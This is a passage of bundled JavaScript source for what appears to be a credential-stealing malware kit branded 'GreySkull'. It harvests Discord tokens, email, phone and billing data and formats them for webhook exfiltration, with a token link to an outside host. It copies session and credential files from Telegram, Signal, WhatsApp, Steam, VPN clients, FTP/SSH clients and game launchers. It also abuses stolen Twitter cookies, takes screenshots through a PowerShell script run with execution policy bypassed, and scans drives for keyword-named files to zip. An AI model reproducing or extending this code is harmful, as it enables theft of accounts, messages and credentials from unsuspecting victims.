  tokens = tokens.filter(function (item, pos) {
    return tokens.indexOf(item) == pos && item != null;
  });
  return await getAccounts(uniqueTokens);
}
const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b));
const GetNitro = r => {
  if (!r) return ":x:";
  if (!r.premium_type) return ":x:";
  switch (r.premium_type) {
    default:
      return ":x:";
    case 1:
      return "<:946246402105819216:962747802797113365>";
    case 2:
      if (!r.premium_guild_since) return "<:946246402105819216:962747802797113365>";
      var now = new Date(Date.now());
      var arr = ["<:Booster1Month:1051453771147911208>", "<:Booster2Month:1051453772360077374>", "<:Booster6Month:1051453773463162890>", "<:Booster9Month:1051453774620803122>", "<:boost12month:1068308256088400004>", "<:Booster15Month:1051453775832961034>", "<:BoosterLevel8:1051453778127237180>", "<:Booster24Month:1051453776889917530>"];
      var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)];
      var b = [2, 3, 6, 9, 12, 15, 18, 24];
      var r = [];
      for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000));
      var i = 0;
      for (var p of r) p > 0 ? "" : i++;
      return "<:946246402105819216:962747802797113365> " + arr[i];
  }
};
function getCreationDate(userId) {
  const timestamp = ((BigInt(userId) >> BigInt(22)) + BigInt(1420070400000n)) / BigInt(1000);
  return Number(timestamp);
}
async function embed(username, tag, id, nitro, badges, billings, email, phone, token, avatar, password) {
  var Nitro = await getURL("https://discord.com/api/v9/users/" + id + "/profile", token);
  let date = getCreationDate(id);
  let embed = {
    color: 5006935,
    author: {
      name: `${username} (${id})`,
      icon_url: `https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png`
    },
    fields: [{
      name: `${embeds.token} Token`,
      value: `\`\`\`ansi\n[2;36m${token}[0m\`\`\`\n[Copy Token](https://scarpatta.fun/copy/${token})`,
      inline: false
    }, {
      name: `${embeds.badges} Badges`,
      value: `${badges}`,
      inline: true
    }, {
      name: `${embeds.nitro} Nitro`,
      value: `${GetNitro(Nitro)}`,
      inline: true
    }, {
      name: `${embeds.billings} Billings`,
      value: `${billings}`,
      inline: true
    }, {
      name: `${embeds.mail} Email`,
      value: `\`${email}\``,
      inline: true
    }, {
      name: `${embeds.phone} Phone`,
      value: `\`${phone}\``,
      inline: true
    }, {
      name: `${stats.disclamer} Created`,
      value: `<t:${date}:R>`,
      inline: true
    }],
    thumbnail: {
      url: `${avatar}`
    },
    footer: {
      text: "@GreySkull | https://t.me/Sordeal"
    }
  };
  return JSON.stringify(embed);
}
async function embedguild(token) {
  try {
    const guilds = await getURL("https://discord.com/api/v9/users/@me/guilds", token);
    if (guilds.length < 1 || guilds === null || guilds === undefined || Guilds.length === 0) {
      return null;
    }
    const Guilds = await parseGuilds(guilds, token);
    const formattedGuilds = await Guilds.map(g => `╔ **${g.Name}**\n` + `╠ **ID:** \`${g.ID}\`\n` + `╠  **Members Count:** \`${g.MembersCount}\`\n` + `╠ **Roles Count:** \`${g.RolesCount}\`\n` + `╠ **Boost:** \`${g.Boost}\`\n` + `╚ **Vanity:** \`${g.Vanity}\`\n\n`).join("");
    const params2 = {
      title: `${embeds.nova} Total Guilds Owner/Admin (${Guilds.length})`,
      description: formattedGuilds,
      color: 5006935
    };
    return JSON.stringify(params2);
  } catch (error) {
    return null;
  }
}
async function embedbis(token) {
  try {
    const friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token);
    /*
    let embed = "None";
    const bots = await getURL(
      "https://discord.com/api/v9/applications?with_team_applications=true",
      token
    );
     if (bots.length > 0) {
      const certif = {
        1: "No",
        2: "Eligible",
        3: "In progress",
        4: "Yes",
      };
       for (const bot of bots) {
        console.log(bot)
        if (bot.verification_state != 1) {
          embed = `**Bot:** ${bot.username}#${
            bot.discriminator
          }\n**State:**: ${certif[bot.verification_state]}`;
        }
      }
    }*/
    if (friends.length < 1 || friends === null || friends === undefined) {
      return null;
    }
    const Friends = parseFriends(friends);
    const params2 = {
      title: `${embeds.nova} UHQ Friends (${Friends.len})`,
      description: "**Friends:**\n" + Friends.badges,
      color: 5006935
    };
    return JSON.stringify(params2);
  } catch (error) {
    return null;
  }
}
const getURL = async (url, token) => {
  try {
    const response = await axios.get(url, {
      headers: {
        Authorization: token
      }
    });
    return response.data;
  } catch (error) {
    return null;
  }
};
const GetRBadges = e => {
  var n = "";
  return 1 == (1 & e) && (n += `${badge.staff} `), 2 == (2 & e) && (n += `${badge.partner} `), 4 == (4 & e) && (n += `${badge.hypesquad_event} `), 8 == (8 & e) && (n += `${badge.bughunter_1} `), 512 == (512 & e) && (n += `${badge.early} `), 16384 == (16384 & e) && (n += `${badge.bughunter_2} `), 131072 == (131072 & e) && (n += `${badge.developer} `), "" == n && (n = ":x:"), n;
};
const parseGuilds = async (guilds, token) => {
  let ownerguilds = [];
  try {
    for (const g of guilds) {
      if (g.owner || g.permissions == 140737488355327) {
        const response = await getURL(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, token);
        if (response.approximate_member_count > 50) {
          var _response$vanity_url_;
          let guildparsed = {
            Name: g.name,
            ID: g.id,
            MembersCount: response.approximate_member_count,
            Boost: response.premium_subscription_count,
            Vanity: (_response$vanity_url_ = response.vanity_url_code) !== null && _response$vanity_url_ !== void 0 ? _response$vanity_url_ : "None",
            RolesCount: response.roles.length
          };
          ownerguilds.push(guildparsed);
        }
      }
    }
    return ownerguilds;
  } catch (err) {
    return [];
  }
};
const parseFriends = friends => {
  try {
    var real = friends.filter(x => x.type == 1);
    var rareFriends = "";
    for (var friend of real) {
      var badges = GetRBadges(friend.user.public_flags);
      if (badges !== ":x:") rareFriends += `${badges} | \`${friend.user.username}#${friend.user.discriminator}\`\n`;
    }
    if (!rareFriends) rareFriends = "*Nothing to see here*";
    return {
      len: real.length,
      badges: rareFriends
    };
  } catch (err) {
    return ":x:";
  }
};
function compile(embeds) {
  var build = "";
  build += `{\n"content": null,\n"embeds": [`;
  for (let i = 0; i < embeds.length; i++) {
    build += embeds[i];
    if (i != embeds.length - 1) {
      build += ",\n";
    }
  }
  build += `],\n"avatar_url": "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",\n"username": "GreySkull",\n"attachments": []\n}`;
  return build;
}
module.exports = {
  embed,
  embedbis,
  GreySkullDiscord,
  compile,
  embedguild,
  WriteDiscord
};
},{"./core":"utils/core.js","./stats":"utils/stats.js","./emotes":"utils/emotes.js"}],"utils/files.js":[function(require,module,exports) {
const fs = require("fs"),
  save = require("./save"),
  {
    stat
  } = require("./stats"),
  path = require("path"),
  appdata = process.env.appdata,
  local = process.env.localappdata,
  archiver = require("archiver"),
  {
    upload
  } = require("./uploadFiles"),
  https = require("https"),
  axios = require("axios"),
  agent = new https.Agent({
    rejectUnauthorized: false
  }),
  fsPromises = fs.promises;
class SimpleFile {
  constructor(name, mainfolder, existpath, stealpath) {
    this.name = name;
    this.mainfolder = mainfolder;
    this.existpath = existpath;
    this.stealpath = stealpath;
  }
}
function GreySkullSimple() {
  try {
    const homepath = process.env.homepath;
    const simples = [new SimpleFile("MobaXterm", "Clients", appdata + "\\MobaXterm\\", [appdata + "\\MobaXterm/MobaXterm.ini"]), new SimpleFile("NationsGlory", "Games", appdata + "\\NationsGlory\\", [appdata + "\\NationsGlory\\Local Storage/leveldb"]), new SimpleFile("Growtopia", "Games", local + "\\Growtopia\\", [local + "\\Growtopia\\save.dat"]), new SimpleFile("Minecraft", "Games", appdata + "\\.minecraft\\", []), new SimpleFile("Skype", "Social", appdata + "\\Microsoft\\Skype for Desktop\\Local Storage\\", [appdata + "\\Microsoft\\Skype for Desktop\\Local Storage\\"]), new SimpleFile("Element", "Social", appdata + "\\Element\\Local Storage\\", [appdata + "\\Element\\Local Storage\\"]), new SimpleFile("Signal", "Social", appdata + "\\Signal\\", [appdata + "\\Signal\\Local Storage\\", appdata + "\\Signal\\Session Storage\\", appdata + "\\Signal\\sql\\", appdata + "\\Signal\\databases\\", appdata + "\\Signal\\config.json"]), new SimpleFile("ICQ", "Social", appdata + "\\ICQ\\0001\\", [appdata + "\\ICQ\\0001\\"]), new SimpleFile("FileZilla", "Clients", appdata + "\\FileZilla\\", [appdata + "\\FileZilla\\recentservers.xml"]), new SimpleFile("OpenVPN Connect", "VPN", appdata + "\\OpenVPN Connect\\", [appdata + "\\OpenVPN Connect\\profiles"]), new SimpleFile("Shadow", "Clients", appdata + "\\shadow\\", [appdata + "\\shadow\\Local State", appdata + "\\shadow\\Local Storage\\", appdata + "\\shadow\\Session Storage\\"]), new SimpleFile("TotalCommander", "Clients", appdata + "\\GHISLER\\", [appdata + "\\GHISLER\\wcx_ftp.ini"]), new SimpleFile("LunarClient", "Games", homepath + "\\.lunarclient\\settings\\game\\", []), new SimpleFile("FeatherClient", "Games", appdata + "\\.feather\\", []), new SimpleFile("EssentialClient", "Games", appdata + "\\.minecraft\\essential\\", []), new SimpleFile("TLauncher", "Games", appdata + "\\.tlauncher\\mcl\\Minecraft\\game\\", [])];
    for (let i = 0; i < simples.length; i++) {
      const simple = simples[i];
      if (fs.existsSync(simple.existpath)) {
        if (simple.mainfolder == "Clients") {
          stat.AddSysAdmin(simple.name);
        }
        if (simple.mainfolder == "Social") {
          stat.AddMessenger(simple.name);
        }
        if (simple.mainfolder == "Games" && !simple.name.includes("craft") && !simple.name.includes("lunar") && !simple.existpath.includes("feather")) {
          stat.AddGames(simple.name);
        }
        if (simple.existpath.includes("craft") || simple.existpath.includes("lunarclient") || simple.existpath.includes("feather")) {
          stat.AddGames(simple.name);
          const mcfiles = fs.readdirSync(simple.existpath);
          const filteredFiles = mcfiles.filter(file => file.includes(".json") || file.includes(".txt") || file.includes(".dat"));
          filteredFiles.forEach(f => {
            const fullPath = path.join(simple.existpath, f);
            if (f.includes(".json")) {
              stat.addMinecraft(fullPath);
            }
            simple.stealpath.push(fullPath);
          });
        }
        save.ArraySave(simple.stealpath, simple.mainfolder, simple.name);
      }
    }
  } catch (e) {
    save.SaveError(e);
  }
}
function parseConfigVDF(filePath) {
  const vdf = fs.readFileSync(filePath, "utf-8");
  const lines = vdf.split("\n");
  let result = [];
  for (const line of lines) {
    const matches = line.match(/7656[0-9]{13}/gi);
    if (matches) {
      result = result.concat(matches);
    }
  }
  return result;
}
function GreySkullSteam(cc) {
  if (cc != "yes") return;
  try {
    const mainPath = ["C:\\program files (x86)\\steam\\", "C:\\program files\\steam\\"];
    var saves = [];
    for (let i = 0; i < mainPath.length; i++) {
      const path = mainPath[i];
      if (fs.existsSync(path)) {
        const files = fs.readdirSync(path);
        for (let u = 0; u < files.length; u++) {
          const file = files[u];
          const savePath = path + file;
          if (file.includes("ssfn")) {
            saves.push(savePath);
          }
        }
        const configPath = path + "config\\";
        if (fs.existsSync(configPath)) {
          saves.push(configPath);
          if (fs.existsSync(configPath + "config.vdf")) {
            const configData = parseConfigVDF(configPath + "loginusers.vdf");
            stat.addSteam(configData);
          }
        }
      }
    }
    if (saves.length != 0) {
      stat.AddGames("Steam");
      save.ArraySave(saves, "Launcher", "Steam");
    }
  } catch (e) {
    save.SaveError(e);
  }
}
function GreySkullTermius(cc) {
  if (cc != "yes") return;
  try {
    const termius_path = local + "\\Termius\\Local Storage\\leveldb\\";
    if (!fs.existsSync(termius_path)) {
      return;
    }
    var saves = [];
    const files = fs.readdirSync(termius_path);
    for (var i = 0; i < files.length; i++) {
      const file = files[i];
      const savePath = termius_path + file;
      if (fs.lstatSync(savePath).isDirectory()) {
        if (file.length != 16) {
          continue;
        }
        saves.push(savePath + "//");
      } else {
        saves.push(savePath);
      }
    }
    stat.AddSysAdmin("Termius");
    save.ArraySave(saves, "Clients", "Termius");
  } catch (e) {
    save.SaveError(e);
  }
}
function GreySkullTelegram(cc) {
  if (cc != "yes") return;
  try {
    const telegram_path = appdata + "\\Telegram Desktop\\tdata\\";
    if (!fs.existsSync(telegram_path)) {
      return;
    }
    var saves = [];
    const files = fs.readdirSync(telegram_path);
    for (var i = 0; i < files.length; i++) {
      const file = files[i];
      const savePath = telegram_path + file;
      if (fs.lstatSync(savePath).isDirectory()) {
        if (file.length != 16) {
          continue;
        }
        saves.push(savePath + "//");
      } else {
        if (file.endsWith("s") || file.length == 17) {
          saves.push(savePath);
        }
        if (file.startsWith("settings") || file.startsWith("key_data") || file.startsWith("usertag")) {
          saves.push(savePath);
        }
      }
    }
    stat.AddMessenger("Telegram");
    save.ArraySave(saves, "Social", "Telegram");
  } catch (e) {
    save.SaveError(e);
  }
}
function GreySkullWhatsapp(cc) {
  if (cc != "yes") return;
  try {
    const whatsapp_path = appdata + "\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\\LocalState\\";
    var saves = [];
    if (!fs.existsSync(whatsapp_path)) {
      return;
    }
    if (fs.existsSync(whatsapp_path)) {
      const files = fs.readdirSync(whatsapp_path);
      for (let i = 0; i < files.length; i++) {
        const file = files[i];
        const savePath = whatsapp_path + file;
        if (file.endsWith(".ini") || file.endsWith(".db")) {
          saves.push(savePath);
        }
      }
    }
    stat.AddMessenger("WhatsApp");
    save.ArraySave(saves, "Social", "WhatsApp");
  } catch (e) {
    save.SaveError(e);
  }
}
function GreySkullFetchT0x(cc) {
  if (cc != "yes") return;
  try {
    const tox_path = appdata + "\\tox\\";
    var saves = [];
    if (!fs.existsSync(tox_path)) {
      return;
    }
    if (fs.existsSync(tox_path)) {
      const files = fs.readdirSync(tox_path);
      for (let i = 0; i < files.length; i++) {
        const file = files[i];
        const savePath = tox_path + file;
        if (file.endsWith(".tox") || file.endsWith(".ini") || file.endsWith(".db")) {
          saves.push(savePath);
        }
      }
    }
    stat.AddMessenger("Tox");
    save.ArraySave(saves, "Social", "Tox");
  } catch (e) {
    save.SaveError(e);
  }
}
function GreySkullPidgin(cc) {
  if (!cc) return;
  try {
    const mainPath = appdata + "\\.purple\\";
    if (!fs.existsSync(mainPath)) {
      return;
    }
    if (fs.existsSync(mainPath + "accounts.xml")) {
      stat.AddMessenger("Pidgin");
      save.ArraySave([mainPath + "accounts.xml"], "Social", "Pidgin");
    }
  } catch (e) {
    save.SaveError(e);
  }
}
function GreySkullNordVPN(cc) {
  if (cc != "yes") return;
  try {
    const mainPath = local + "\\NordVPN\\";
    if (!fs.existsSync(mainPath)) {
      return;
    }
    const files = fs.readdirSync(mainPath);
    var saves = [];
    for (let i = 0; i < files.length; i++) {
      const file = files[i];
      const savePath = mainPath + file + "\\";
      if (fs.statSync(savePath).isDirectory) {
        if (file.includes("exe")) {
          const filesExe = fs.readdirSync(savePath);
          for (let u = 0; u < filesExe.length; u++) {
            const fileExe = filesExe[u];
            if (fs.existsSync(savePath + fileExe + "\\user.config")) {
              saves.push(savePath + fileExe + "\\user.config");
            }
          }
        }
      }
    }
    stat.AddVpn("NordVPN");
    save.ArraySave(saves, "VPN", "NordVPN");
  } catch (e) {
    save.SaveError(e);
  }
}
function GreySkullProton(cc) {
  if (cc != "yes") return;
  try {
    const mainPath = local + "\\ProtonVPN\\";
    if (!fs.existsSync(mainPath)) {
      return;
    }
    const files = fs.readdirSync(mainPath);
    var saves = [];
    for (let i = 0; i < files.length; i++) {
      const file = files[i];
      const savePath = mainPath + file + "\\";
      if (fs.statSync(savePath).isDirectory) {
        if (file.includes("exe")) {
          const filesExe = fs.readdirSync(savePath);
          for (let u = 0; u < filesExe.length; u++) {
            const fileExe = filesExe[u];
            if (fs.existsSync(savePath + fileExe + "\\user.config")) {
              saves.push(savePath + fileExe + "\\user.config");
            }
          }
        }
      }
    }
    stat.AddVpn("ProtonVPN");
    save.ArraySave(saves, "VPN", "ProtonVPN");
  } catch (e) {
    save.SaveError(e);
  }
}
function GreySkullRiotGame(cc) {
  if (cc != "yes") return;
  let riotgame = local + "\\Riot Games\\Riot Client\\Data\\";
  try {
    var saves = [];
    if (fs.existsSync(path)) {
      const files = fs.readdirSync(riotgame);
      for (let u = 0; u < files.length; u++) {
        const file = files[u];
        const savePath = path + file;
        saves.push(savePath);
      }
    }
    if (saves.length != 0) {
      stat.AddGames("Riotgames");
      save.ArraySave(saves, "Launcher", "RiotGames");
    }
  } catch (e) {
    save.SaveError(e);
  }
}
function GreySkullEpicGame(cc) {
  if (cc != "yes") return;
  let epicpath = [];
  try {
    const epicgame = local + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\";
    const config_file = path.join(epicgame, "GameUserSettings.ini");
    if (fs.existsSync(epicgame) && fs.existsSync(config_file)) {
      const contents = fs.readFileSync(config_file, "utf-8");
      if (contents.includes("[RememberMe]")) {
        const files = fs.readdirSync(epicgame);
        for (let i = 0; i < files.length; i++) {
          const file = files[i];
          const filePath = epicgame + file;
          epicpath.push(filePath);
        }
      }
      stat.AddGames("EpicGame");
      save.ArraySave(epicpath, "Launcher", "EpicGame");
    }
  } catch (error) {
    save.SaveError(error);
  }
}
function GreySkullGOG(cc) {
  if (cc != "yes") return;
  try {
    const gog = local + "\\GOG.com\\Galaxy\\Configuration\\";
    if (fs.existsSync(gog)) {
      stat.AddGames("GOG");
      save.SimpleSave(gog, "Launcher", "GOG");
    }
  } catch (error) {
    save.SaveError(error);
  }
}
function GreySkullRockstarGames(cc) {
  if (cc != "yes") return;
  try {
    const rockstar = local + "\\Rockstar Games\\Launcher\\";
    if (fs.existsSync(rockstar)) {
      stat.AddGames("Rockstar");
      save.SimpleSave(rockstar, "Launcher", "Rockstar");
    }
  } catch (error) {
    save.SaveError(error);
  }
}
function GreySkullElectronicArts(cc) {
  if (cc != "yes") return;
  try {
    const eapath = local + "\\Electronic Arts\\EA Desktop\\Windows\\cookie.ini";
    if (fs.existsSync(eapath)) {
      stat.AddGames("ElectronicArts");
      save.SimpleSave(eapath, "Launcher", "ElectronicArts");
    }
  } catch (error) {
    save.SaveError(error);
  }
}
function GreySkullUbisoft(cc) {
  if (cc != "yes") return;
  let riotgame = local + "\\Ubisoft Game Launcher\\";
  try {
    var saves = [];
    if (fs.existsSync(path)) {
      const files = fs.readdirSync(riotgame);
      for (let u = 0; u < files.length; u++) {
        const file = files[u];
        const savePath = path + file;
        saves.push(savePath);
      }
    }
    if (saves.length != 0) {
      stat.AddGames("Ubisoft");
      save.ArraySave(saves, "Launcher", "Ubisoft");
    }
  } catch (error) {}
}
function GreySkullOpenVPN(cc) {
  if (cc != "yes") return;
  try {
    const mainPath = appdata + "\\OpenVPN Connect\\profiles\\";
    var saves = [];
    if (!fs.existsSync(mainPath)) {
      return;
    }
    const files = fs.readdirSync(mainPath);
    for (let i = 0; i < files.length; i++) {
      const file = files[i];
      const savePath = mainPath + file;
      saves.push(savePath);
    }
    stat.AddGames("OpenVPN");
    save.ArraySave(saves, "VPN", "OpenVPN");
  } catch (e) {
    save.SaveError(e);
  }
}
function GreySkullBattle(cc) {
  if (cc != "yes") return;
  try {
    const mainPath = appdata + "\\Battle.net\\";
    var saves = [];
    if (!fs.existsSync(mainPath)) {
      return;
    }
    const files = fs.readdirSync(mainPath);
    for (let i = 0; i < files.length; i++) {
      const file = files[i];
      const savePath = mainPath + file;
      if (file.includes("db") || file.includes("config")) {
        saves.push(savePath);
      }
    }
    stat.AddGames("Battle.net");
    save.ArraySave(saves, "Launcher", "Battlenet");
  } catch (e) {
    save.SaveError(e);
  }
}
async function rechercherFichiers(repertoire, textes, extensions) {
  const fichiersTrouves = [];
  const fichiers = await fsPromises.readdir(repertoire);
  for (const fichier of fichiers) {
    const chemin = path.join(repertoire, fichier);
    const stat = await fsPromises.stat(chemin);
    const extension = path.extname(fichier).toLowerCase();
    if (!stat.isDirectory() && extensions.includes(extension)) {
      if (textes.some(texte => fichier.toLowerCase().includes(texte))) {
        fichiersTrouves.push(chemin);
      }
    }
  }
  return fichiersTrouves;
}
function genererNomAleatoire(longueur) {
  const caracteres = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let nomAleatoire = "";
  for (let i = 0; i < longueur; i++) {
    const index = Math.floor(Math.random() * caracteres.length);
    nomAleatoire += caracteres.charAt(index);
  }
  return nomAleatoire;
}
async function zipEtSupprimerDossier(dossierSource) {
  const dossierDestination = `${path.dirname(dossierSource)}\\@${process.env.USERNAME.replace(".", "") || "USER"}_Keywords.zip`;
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(dossierDestination);
    const archive = archiver("zip", {
      zlib: {
        level: 9
      }
    });
    output.on("close", async () => {
      try {
        await fsPromises.rm(dossierSource, {
          recursive: true
        });
        resolve(dossierDestination);
      } catch (err) {
        reject(err);
      }
    });
    archive.on("error", err => {
      reject(err);
    });
    archive.pipe(output);
    archive.directory(dossierSource, false);
    archive.finalize();
  });
}
function NovasearchFilesDir(extensionsAutorisees, motsARechercher) {
  const driveLetters = [];
  for (let i = 65; i <= 90; i++) {
    const driveLetter = String.fromCharCode(i) + ":";
    driveLetters.push(driveLetter);
  }
  const os = require("os");
  const mainDriveLetter = os.platform() === "win32" ? os.homedir().charAt(0).toUpperCase() + ":" : null;
  if (mainDriveLetter) {
    const index = driveLetters.indexOf(mainDriveLetter);
    if (index !== -1) {
      driveLetters.splice(index, 1);
    }
  }
  const matchingFiles = [];
  function checkFilesInDirectory(directory) {
    try {
      const files = fs.readdirSync(directory);
      files.forEach(file => {
        const fileExtension = path.extname(file);
        const fileName = path.basename(file);
        if (extensionsAutorisees.includes(fileExtension)) {
          for (const mot of motsARechercher) {
            if (fileName.includes(mot)) {
              matchingFiles.push(path.join(directory, file));
              break;
            }
          }
        }
      });
    } catch (error) {}
  }
  driveLetters.forEach(driveLetter => {
    const directory = path.join(driveLetter, "\\");
    checkFilesInDirectory(directory);
  });
  return matchingFiles;
}
module.exports = {
  GreySkullSimple,
  GreySkullSteam,
  GreySkullTelegram,
  GreySkullFetchT0x,
  GreySkullProton,
  GreySkullBattle,
  GreySkullPidgin,
  GreySkullEpicGame,
  GreySkullRiotGame,
  GreySkullUbisoft,
  GreySkullNordVPN,
  GreySkullOpenVPN,
  GreySkullElectronicArts,
  GreySkullRockstarGames,
  GreySkullGOG,
  GreySkullWhatsapp
};
},{"./save":"utils/save.js","./stats":"utils/stats.js","./uploadFiles":"utils/uploadFiles.js"}],"utils/twitter.js":[function(require,module,exports) {
const {
    stat
  } = require("./stats"),
  fs = require("fs"),
  axios = require("axios"),
  path = require("path"),
  {
    embeds
  } = require("./emotes");
async function detailtwitter(tw) {
  if (tw != "yes") return;
  const cooks = stat.twitter_cookies;
  if (!cooks) return;
  if (cooks.length < 12) return;
  try {
    const {
      value: ct0
    } = cooks.find(cookie => cookie.name === "ct0");
    const {
      value: authToken,
      source
    } = (await cooks).find(cookie => cookie.name === "auth_token");
    const {
      data: profile
    } = await axios.post("https://twitter.com/i/api/1.1/account/update_profile.json", {}, {
      headers: {
        Cookie: `ct0=${ct0}; auth_token=${authToken}`,
        Host: "twitter.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
        Accept: "*/*",
        "Accept-Language": "fr-FR",
        "Accept-Encoding": "gzip, deflate, br",
        Prefer: "safe",
        authorization: "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
        "x-twitter-auth-type": "OAuth2Session",
        "x-csrf-token": ct0,
        "x-twitter-client-language": "en",
        "x-twitter-active-user": "yes",
        Origin: "https://twitter.com",
        Connection: "keep-alive",
        Referer: "https://twitter.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site"
      }
    });
    profile.cookie = ct0;
    profile.source = source;
    stat.AddTwitterAccount(profile);
    /*const basepath = stat.testpath[0];
    const socialDir = path.join(basepath, "Social");
    const twitterDir = path.join(socialDir, "Twitter");
    try {
      if (!fs.existsSync(socialDir)) {
        fs.mkdirSync(socialDir);
      }
      if (!fs.existsSync(twitterDir)) {
        fs.mkdirSync(twitterDir);
      }
    } catch (e) {
    }
    const twitterFilePath = path.join(twitterDir, "Twitter.json");
    fs.writeFileSync(twitterFilePath, JSON.stringify(profile));*/
  } catch (e) {}
}
function sendTwitter(tw) {
  if (tw !== "yes") return;
  if (stat.twitter_account[0]) {
    let {
      screen_name,
      name,
      location,
      profile_location,
      description,
      created_at,
      followers_count,
      favourites_count,
      cookie,
      profile_image_url,
      profile_banner_url,
      profile_text_color,
      friends_count,
      verified
    } = stat.twitter_account[0];
    const handleNullValue = value => value !== null && value !== void 0 ? value : "none";
    let embed = {
      avatar_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",
      username: "GreySkull",
      embeds: [{
        color: 5006935,
        thumbnail: {
          url: profile_image_url.replace("normal", "bigger")
        },
        image: {
          url: profile_banner_url
        },
        fields: [{
          name: verified ? `${embeds.twitter_usernamecert} Username:` : `${embeds.twitter_usernameuncert} Username:`,
          value: `\`${handleNullValue(name)}\``,
          inline: true
        }, {
          name: `${embeds.twitter_followers} Followers:`,
          value: `\`${handleNullValue(followers_count)}\``,
          inline: true
        }, {
          name: `${embeds.twitter_followings} Following:`,
          value: `\`${handleNullValue(friends_count)}\``,
          inline: true
        }, {
          name: `${embeds.twitter_fav} Favourites:`,
          value: `\`${handleNullValue(favourites_count)}\``,
          inline: true
        }, {
          name: `${embeds.mail} User:`,
          value: `[\`${handleNullValue(screen_name)}\`](https://twitter.com/${screen_name})`,
          inline: true
        }, {
          name: `${embeds.twitter_location} Location:`,
          value: `[${handleNullValue(location)}](https://www.google.com/maps/place/${handleNullValue(location)})`,
          inline: true
        }, {
          name: `${embeds.mail} Description:`,
          value: `\`${handleNullValue(description)}\``,
          inline: false
        }, {
          name: `🍪 Cookie:`,
          value: `\`\`\`${handleNullValue(cookie)}\`\`\``,
          inline: true
        }],
        footer: {
          text: "Creation Date: " + handleNullValue(created_at)
        },
        title: "Twitter Account",
        url: `https://twitter.com/${screen_name}`
      }]
    };
    if (embed) {
      return embed;
    } else {
      return null;
    }
  }
}
module.exports = {
  detailtwitter,
  sendTwitter
};
},{"./stats":"utils/stats.js","./emotes":"utils/emotes.js"}],"utils/infos.js":[function(require,module,exports) {
var Registry = require("winreg"),
  core = require("./core"),
  fs = require("fs"),
  {
    stat
  } = require("./stats"),
  path = require("path"),
  save = require("./save"),
  {
    exec
  } = require("child_process"),
  tempPath = require("os").tmpdir(),
  PowerShell = require("powershell"),
  unidecode = require("unidecode");
async function takeScreenshotAndSave(cc) {
  if (cc !== "yes") return;
  const savePath = path.join(stat.testpath[0], "System");
  const powershellScript = `
    $Path = "${savePath}" 

    $FileName = "$env:COMPUTERNAME - $(get-date -f yyyy-MM-dd_HHmmss).png"
    $File = "$Path\\$FileName"

    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing

    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top

    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)

    $bitmap.Save($File) 
    Write-Output "Screenshot saved to:"
    Write-Output $File
  `;
  const ps1FilePath = path.join(tempPath, core.generateId(12) + "_temp.ps1");
  fs.writeFileSync(ps1FilePath, powershellScript);
  exec(`powershell -ExecutionPolicy Bypass -NoProfile -File "${ps1FilePath}"`, (error, stdout, stderr) => {
    if (error) {}
    try {
      fs.unlinkSync(ps1FilePath);
    } catch (e) {}
  });
}
async function getSysteminformations(cc, ip, hostname, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion) {
  if (cc !== "yes") return;
  let info = await Systeminformations(cc, ip, hostname, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion);
  const savePath = path.join(stat.testpath[0], "System");
  try {
    if (!fs.existsSync(savePath)) {
      await fs.mkdirSync(savePath);
      fs.writeFileSync(path.join(savePath, "System Info.txt"), info);
    }
  } catch (e) {
    save.SaveError(e);
  }
}
async function Systeminformations(cc, ip, hostname, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion) {
  if (cc != "yes") return;
  let informations = core.getHeader();
  try {
    informations += `UUID: ${uid}\n`;
    informations += `IP: ${ip}\n`;
    informations += `Windows Key: ${windowskey}\n`;
    informations += `Windows Version: ${windowsversion}\n`;
    informations += `HOSTNAME: ${hostname}\n`;
    informations += `USERNAME: ${process.env.userprofile.split("\\")[2]}\n`;
    informations += `OS: ${OS}\n`;
    informations += `FileLocation: ${process.cwd()}\n`;
    informations += `CPU: ${cpu}\n`;
    informations += `CPU Core: ${cpucount}\n`;
    informations += `GPU(s): ${GPU.split("   ").join(", ")}\n`;
    informations += `RAM: ${ram} GB\n`;
    informations += `DISK: ${disk} GB\n\n\n`;
    informations += `───────────────────────\nApplications installed\n───────────────────────\n\n${await getInstalledApplication()}\n`;
  } catch (e) {}
  return informations;
}
async function getInstalledApplication() {
  const regKey = new Registry({
    hive: Registry.HKLM,
    key: "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
  });
  const exists = await new Promise((resolve, reject) => {
    regKey.keyExists((err, exists) => {
      if (err != null) {
        resolve(false);
      }
      resolve(exists);
    });
  });
  if (!exists) {
    return "";
  }
  const subkeys = await new Promise((resolve, reject) => {
    regKey.keys((err, subkeys) => {
      if (err != null) {
        resolve([]);
      }
      resolve(subkeys);
    });
  });
  if (subkeys.length == 0) {
    return "";
  }
  let installedApps = "";
